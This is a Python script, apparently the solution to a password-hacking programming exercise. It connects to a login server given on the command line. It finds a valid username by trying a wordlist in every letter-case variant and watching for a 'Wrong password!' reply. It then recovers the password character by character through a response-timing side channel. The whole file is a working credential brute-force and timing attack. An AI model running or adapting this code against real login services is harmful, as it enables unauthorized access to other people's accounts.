import socket
import sys
import itertools
import string
import json
from datetime import datetime


def connect(hostname, port):
    with socket.socket() as client:
        address = (hostname, port)
        client.connect(address)

        login_dict = {'login': ' ',
                      'password': ' '}

        login_gen = dict_brute_force('hacking/login.txt')
        for login in login_gen:
            login_dict['login'] = login
            client.send(json.dumps(login_dict).encode())

            response_dict = json.loads(client.recv(1024).decode())
            if response_dict['result'] == "Wrong password!":
                break

        verified_letters = ''
        while True:
            letter_gen = brute_letters()
            time_dict = {}

            for new_letter in letter_gen:
                login_dict['password'] = verified_letters + new_letter

                t_0 = datetime.now()
                client.send(json.dumps(login_dict).encode())

                response = client.recv(1024).decode()
                response_dict = json.loads(response)
                t_1 = datetime.now()

                delta_t = t_1 - t_0
                time_dict.update({new_letter: delta_t})

                if response_dict['result'] == "Connection success!":
                    return json.dumps(login_dict)

            verified_letters += max(time_dict, key=lambda k: time_dict[k])


def brute_letters():
    characters = string.ascii_letters + string.digits
    for character in characters:
        yield character


def brute_force(pw_len):
    characters = string.ascii_lowercase + string.digits
    for n in range(pw_len):
        passwords = itertools.product(characters, repeat=n+1)

        for password in passwords:
            yield ''.join(password)


def read_file(file_name):
    with open(file_name, 'r') as items:
        for item in items:
            yield item.strip()


def dict_brute_force(file_name):
    for item in read_file(file_name):
        for case_perm in itertools.product((True, False), repeat=len(item)):
            new_cases = [letter.lower() if case else letter.upper()
                         for letter, case in zip(item, case_perm)]
            yield ''.join(new_cases)


arg = sys.argv
print(connect(arg[1], int(arg[2])))
